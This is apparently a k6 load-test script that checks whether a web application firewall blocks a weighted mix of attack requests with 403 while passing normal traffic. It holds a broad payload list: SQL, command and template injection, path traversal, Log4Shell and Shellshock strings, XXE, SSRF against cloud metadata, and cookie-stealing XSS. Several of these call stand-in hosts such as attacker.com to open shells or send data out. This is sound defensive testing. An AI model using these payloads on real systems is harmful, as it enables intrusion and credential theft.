import http from "k6/http";
import { check } from "k6";

const BASE_URL = __ENV.BASE_URL || "https://whoami.kapsule.camier.family";

export const options = {
  stages: [
    { duration: "30s", target: 50 },
    { duration: "3m", target: 50 },
    { duration: "30s", target: 0 },
  ],
  thresholds: {
    http_req_duration: ["p(95)<3000"],
  },
};

// --- Legitimate requests (30%) - expected 200 ---

const legit = [
  { method: "GET", path: "/" },
  { method: "GET", path: "/api/health" },
  { method: "GET", path: "/about" },
  { method: "GET", path: "/contact" },
  { method: "GET", path: "/products" },
  { method: "GET", path: "/api/status" },
  { method: "GET", path: "/favicon.ico" },
  { method: "GET", path: "/robots.txt" },
  { method: "GET", path: "/api/version" },
  {
    method: "POST",
    path: "/api/feedback",
    body: JSON.stringify({ message: "Great service!", rating: 5 }),
    headers: { "Content-Type": "application/json" },
  },
  {
    method: "POST",
    path: "/api/search",
    body: JSON.stringify({ query: "blue shoes", page: 1 }),
    headers: { "Content-Type": "application/json" },
  },
  { method: "GET", path: "/api/products?category=electronics&page=1" },
  { method: "GET", path: "/api/users/me", headers: { Authorization: "Bearer valid_token_abc" } },
  { method: "GET", path: "/docs" },
  { method: "GET", path: "/sitemap.xml" },
];

// --- Attack requests (70%) - expected 403 ---

const attacks = [
  // ── A01 - Broken Access Control (w=3) ─────────────────────────
  { w: 3, method: "GET", path: "/download?file=../../../../etc/passwd", name: "path-traversal-linux" },
  { w: 3, method: "GET", path: "/download?file=....//....//....//etc/passwd", name: "path-traversal-double" },
  { w: 3, method: "GET", path: "/download?file=..\\..\\..\\..\\windows\\system32\\config\\sam", name: "path-traversal-windows" },
  { w: 3, method: "GET", path: "/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", name: "path-traversal-encoded" },
  { w: 3, method: "GET", path: "/download?file=..%252f..%252f..%252fetc%252fpasswd", name: "path-traversal-double-encoded" },
  { w: 1, method: "GET", path: "/.env", name: "env-exposure" },
  { w: 1, method: "GET", path: "/.git/config", name: "git-exposure" },
  { w: 1, method: "GET", path: "/.git/HEAD", name: "git-head" },
  { w: 1, method: "GET", path: "/backup.sql", name: "backup-exposure" },
  { w: 1, method: "GET", path: "/wp-config.php.bak", name: "wp-config-bak" },

  // ── A02 - Cryptographic Failures ──────────────────────────────
  { w: 1, method: "GET", path: "/api/users?ssn=123-45-6789&credit_card=4532123456789012", name: "sensitive-data-url" },
  { w: 1, method: "GET", path: "/database.sql.bak", name: "db-backup" },
  { w: 1, method: "GET", path: "/config.php.old", name: "config-exposure" },
  { w: 1, method: "GET", path: "/app.py.swp", name: "swp-exposure" },

  // ── A03 - SQL Injection (w=5, most common WAF trigger) ────────
  {
    w: 5, method: "POST", path: "/login",
    body: "username=admin' OR '1'='1&password=anything",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    name: "sqli-auth-bypass",
  },
  {
    w: 5, method: "POST", path: "/login",
    body: "username=admin'--&password=x",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    name: "sqli-comment",
  },
  {
    w: 5, method: "POST", path: "/login",
    body: "username=' OR 1=1#&password=x",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    name: "sqli-hash-comment",
  },
  { w: 5, method: "GET", path: "/products?id=1' UNION SELECT username,password,3 FROM users--", name: "sqli-union" },
  { w: 5, method: "GET", path: "/products?id=1 UNION ALL SELECT NULL,NULL,NULL--", name: "sqli-union-null" },
  { w: 5, method: "GET", path: "/search?q=test' AND SLEEP(5)--", name: "sqli-time-blind" },
  { w: 5, method: "GET", path: "/search?q=test' AND BENCHMARK(10000000,SHA1('test'))--", name: "sqli-benchmark" },
  { w: 5, method: "GET", path: "/user?id=1' AND 1=1--", name: "sqli-boolean-blind" },
  { w: 5, method: "GET", path: "/user?id=1' AND SUBSTRING(@@version,1,1)='5'--", name: "sqli-version-probe" },
  {
    w: 5, method: "POST", path: "/update",
    body: "name=John'; DROP TABLE users; SELECT * FROM products--",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    name: "sqli-stacked",
  },
  {
    w: 5, method: "POST", path: "/search",
    body: "q=test' WAITFOR DELAY '0:0:5'--",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    name: "sqli-waitfor",
  },
  { w: 3, method: "GET", path: "/products?sort=name;SELECT+*+FROM+users", name: "sqli-in-sort" },
  { w: 3, method: "GET", path: "/api/items?id=1%27%20OR%20%271%27%3D%271", name: "sqli-encoded" },

  // ── A03 - Command Injection (w=4) ─────────────────────────────
  { w: 4, method: "GET", path: "/ping?host=127.0.0.1; cat /etc/passwd", name: "cmdi-semicolon" },
  { w: 4, method: "GET", path: "/ping?host=127.0.0.1 && cat /etc/passwd", name: "cmdi-and" },
  { w: 4, method: "GET", path: "/ping?host=127.0.0.1 || cat /etc/passwd", name: "cmdi-or" },
  { w: 4, method: "GET", path: "/ping?host=`whoami`", name: "cmdi-backtick" },
  { w: 4, method: "GET", path: "/ping?host=$(id)", name: "cmdi-subshell" },
  { w: 4, method: "GET", path: "/ping?host=127.0.0.1 | nc attacker.com 4444", name: "cmdi-pipe" },
  { w: 4, method: "GET", path: "/ping?host=127.0.0.1%0als", name: "cmdi-newline" },

  // ── A03 - NoSQL / LDAP / Template Injection ───────────────────
  {
    w: 2, method: "POST", path: "/api/login",
    body: JSON.stringify({ username: { $ne: null }, password: { $ne: null } }),
    headers: { "Content-Type": "application/json" },
    name: "nosql-ne",
  },
  {
    w: 2, method: "POST", path: "/api/login",
    body: JSON.stringify({ username: { $gt: "" }, password: { $gt: "" } }),
    headers: { "Content-Type": "application/json" },
    name: "nosql-gt",
  },
  {
    w: 2, method: "POST", path: "/api/login",
    body: JSON.stringify({ username: "admin", password: { $regex: "^.*" } }),
    headers: { "Content-Type": "application/json" },
    name: "nosql-regex",
  },
  {
    w: 2, method: "POST", path: "/ldap/search",
    body: "username=admin)(&(password=*))(&(a=",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    name: "ldap-injection",
  },
  { w: 2, method: "GET", path: "/hello?name={{7*7}}", name: "ssti-jinja2" },
  { w: 2, method: "GET", path: "/hello?name=${7*7}", name: "ssti-freemarker" },
  { w: 2, method: "GET", path: "/hello?name=#{7*7}", name: "ssti-thymeleaf" },
  { w: 2, method: "GET", path: "/search?user=admin' or '1'='1", name: "xpath-injection" },

  // ── A06 - Vulnerable Components (w=3) ─────────────────────────
  {
    w: 3, method: "GET", path: "/",
    headers: { "User-Agent": "${jndi:ldap://attacker.com/a}" },
    name: "log4shell-ua",
  },
  {
    w: 3, method: "GET", path: "/",
    headers: { "X-Api-Version": "${jndi:ldap://attacker.com/a}" },
    name: "log4shell-header",
  },
  {
    w: 3, method: "GET", path: "/?q=${jndi:ldap://attacker.com/a}",
    name: "log4shell-param",
  },
  {
    w: 3, method: "GET", path: "/cgi-bin/test.sh",
    headers: { "User-Agent": "() { :; }; echo; /bin/bash -c 'cat /etc/passwd'" },
    name: "shellshock",
  },
  {
    w: 3, method: "GET", path: "/",
    headers: { "Referer": "() { :; }; /bin/bash -c 'wget http://attacker.com/shell'" },
    name: "shellshock-referer",
  },
  {
    w: 2, method: "GET", path: "/",
    headers: { "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}" },
    name: "struts2-rce",
  },

  // ── A08 - Integrity Failures / XXE (w=3) ──────────────────────
  {
    w: 3, method: "POST", path: "/api/xml",
    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>',
    headers: { "Content-Type": "application/xml" },
    name: "xxe-file",
  },
  {
    w: 3, method: "POST", path: "/api/xml",
    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><user><name>test</name></user>',
    headers: { "Content-Type": "application/xml" },
    name: "xxe-oob",
  },
  {
    w: 3, method: "POST", path: "/api/xml",
    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',
    headers: { "Content-Type": "application/xml" },
    name: "xxe-ssrf",
  },
  {
    w: 2, method: "POST", path: "/api/deploy",
    body: JSON.stringify({ branch: "main; curl http://attacker.com/shell.sh | bash", env: "prod" }),
    headers: { "Content-Type": "application/json" },
    name: "cicd-injection",
  },
  {
    w: 2, method: "POST", path: "/api/process",
    body: "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
    headers: { "Content-Type": "application/x-java-serialized-object" },
    name: "java-deserialization",
  },

  // ── A09 - Logging Failures ────────────────────────────────────
  {
    w: 1, method: "POST", path: "/login",
    body: "username=admin%0d%0aINFO: User admin logged in successfully",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    name: "log-injection-crlf",
  },
  { w: 1, method: "GET", path: "/search?q=test%0aADMIN_ACCESS_GRANTED", name: "log-injection-newline" },

  // ── A10 - SSRF (w=3) ─────────────────────────────────────────
  { w: 3, method: "GET", path: "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", name: "ssrf-aws" },
  { w: 3, method: "GET", path: "/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01", name: "ssrf-azure" },
  { w: 3, method: "GET", path: "/fetch?url=http://metadata.google.internal/computeMetadata/v1/", name: "ssrf-gcp" },
  { w: 3, method: "GET", path: "/fetch?url=http://localhost:8080/admin", name: "ssrf-localhost" },
  { w: 3, method: "GET", path: "/fetch?url=http://127.0.0.1:22", name: "ssrf-loopback-port" },
  { w: 3, method: "GET", path: "/fetch?url=file:///etc/passwd", name: "ssrf-file-proto" },
  { w: 3, method: "GET", path: "/fetch?url=http://192.168.1.1", name: "ssrf-internal" },
  { w: 2, method: "GET", path: "/fetch?url=http://expected.com@169.254.169.254/metadata", name: "ssrf-at-bypass" },
  {
    w: 2, method: "POST", path: "/webhook",
    body: JSON.stringify({ callback_url: "http://attacker.com/exfiltrate" }),
    headers: { "Content-Type": "application/json" },
    name: "ssrf-blind",
  },

  // ── XSS (w=5, most common WAF trigger) ────────────────────────
  { w: 5, method: "GET", path: "/search?q=<script>alert(1)</script>", name: "xss-basic" },
  { w: 5, method: "GET", path: "/search?q=<script>alert(document.cookie)</script>", name: "xss-cookie-steal" },
  { w: 5, method: "GET", path: "/search?q=<img src=x onerror=alert(1)>", name: "xss-img-onerror" },
  { w: 5, method: "GET", path: "/search?q=<body onload=alert(1)>", name: "xss-body-onload" },
  { w: 5, method: "GET", path: "/search?q=<svg/onload=alert(1)>", name: "xss-svg" },
  { w: 5, method: "GET", path: '/search?q=<a href="javascript:alert(1)">Click</a>', name: "xss-js-proto" },
  { w: 5, method: "GET", path: "/search?q=<iframe src=javascript:alert(1)>", name: "xss-iframe" },
  { w: 5, method: "GET", path: "/search?q=<details open ontoggle=alert(1)>", name: "xss-details" },
  { w: 5, method: "GET", path: "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", name: "xss-encoded" },
  { w: 5, method: "GET", path: "/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E", name: "xss-double-encoded" },
  { w: 3, method: "GET", path: "/search?q=<scr<script>ipt>alert(1)</scr</script>ipt>", name: "xss-nested" },
  {
    w: 5, method: "POST", path: "/api/comments",
    body: JSON.stringify({ comment: "<script>fetch('http://attacker.com?c='+document.cookie)</script>" }),
    headers: { "Content-Type": "application/json" },
    name: "xss-stored",
  },
  {
    w: 3, method: "POST", path: "/api/profile",
    body: JSON.stringify({ bio: '<img src=x onerror="new Image().src=\'http://evil.com/?\'+document.cookie">' }),
    headers: { "Content-Type": "application/json" },
    name: "xss-stored-img",
  },
  {
    w: 3, method: "POST", path: "/api/feedback",
    body: JSON.stringify({ message: "<svg><script>alert(1)</script></svg>" }),
    headers: { "Content-Type": "application/json" },
    name: "xss-stored-svg",
  },
];

// --- Execution ---

function pick(arr) {
  if (!arr[0].w) return arr[Math.floor(Math.random() * arr.length)];
  const total = arr.reduce((s, e) => s + (e.w || 1), 0);
  let r = Math.random() * total;
  for (const e of arr) {
    r -= e.w || 1;
    if (r <= 0) return e;
  }
  return arr[arr.length - 1];
}

function send(req) {
  const url = encodeURI(BASE_URL + req.path).replace(/'/g, "%27");
  const params = { headers: req.headers || {}, tags: { name: req.name || req.path } };

  if (req.method === "POST") {
    return http.post(url, req.body || "", params);
  }
  return http.get(url, params);
}

export default function () {
  const isLegit = Math.random() < 0.3;

  if (isLegit) {
    const req = pick(legit);
    const res = send(req);
    check(res, { "legit: status 200": (r) => r.status === 200 });
  } else {
    const req = pick(attacks);
    const res = send(req);
    check(res, { "attack: status 403": (r) => r.status === 403 });
  }
}
